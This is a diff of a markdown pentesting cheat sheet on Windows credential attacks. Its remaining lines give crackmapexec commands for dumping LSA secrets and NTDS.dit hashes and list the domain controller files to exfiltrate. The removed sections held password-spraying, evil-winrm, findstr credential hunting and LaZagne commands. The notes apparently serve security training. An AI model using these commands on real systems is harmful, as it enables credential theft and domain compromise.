@@ -5,7 +5,7 @@
 - [SAM Attacks](#sam-attacks)
 - [LSASS Attacks](#lsass-attacks)
 - [NTDS.dit Attacks](#ntds.dit-attacks)
-- [Credential Hunting](#credential-hunting)
+
 ---
 ##### Transfer Files Technique
 Transfer files from the target to the attacker machine using [Impacket's smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py).
@@ -90,17 +90,11 @@ Pulling hashes from memory by dumping the `lsass.exe` process memory.
 > `crackmapexec smb <IP> --local-auth -u <Username> -p <Password> --lsa`
 
 ---
-## NTDS.dit Attacks
-Extracting hashes from the NTDS database (ntds.dit) on a **Domain Controller**.
+## NTDS.dit Attacks 
 
-- Lunch Dictionary Attack if an account lockout policy is not enforced.
-	``` bash
-	crackmapexec smb <IP> -u <UserName_wordlist> -p /usr/share/wordlists/fasttrack.txt
-	```
-- If the dictionary attack worked and we got a DC creds, login to the DC system using `evil-winrm`.
-	``` bash
-	evil-winrm -i <IP> -u <UserName> -p '<Password>'
-	```
+See [This](%2E%2E/%2E%2E/PE/Windows/Groups%20Priv/Backup%20Operators#Copying%20NTDS%2Edit)
+
+Extracting hashes from the NTDS database (ntds.dit) on a **Domain Controller**.
 
 - With access to a DC, to dump secrets from NTDS.dit, attacker should exfiltrate:
 	- `C:\Windows\NTDS\NTDS.dit`
@@ -143,20 +137,4 @@ Extracting hashes from the NTDS database (ntds.dit) on a **Domain Controller**.
 > CrackMapExec can accomplish the same steps shown above, all with one command.
 > `crackmapexec smb <IP> -u <UserName> -p <Password> --ntds`
 
----
-## Credential Hunting
-
-Once we have access to a target, we can hunt stored credentials stored on it.
-- Key Terms to Search: Passwords, Passphrases, Keys, Username, User account, Creds, Users, Passkeys, Passphrases, configuration, dbcredential, dbpassword, pwd, Login, Credentials. using findstr:
-	``` Powershell
-	findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
-	```
-- We can transfer [Lazagne](https://github.com/AlessandroZ/LaZagne/releases/) to the target host, using the [Transfer Files Technique](#transfer-files-technique) discussed above then run it with the next command
-	``` CMD
-	C:\> start lazagne.exe all
-	```
-- Other places we should keep in mind when credential hunting:
-	- Group Policy and scripts in the SYSVOL share.
-	- Look at IT shares.
-	- Passwords in the AD user or computer description fields.
 ---
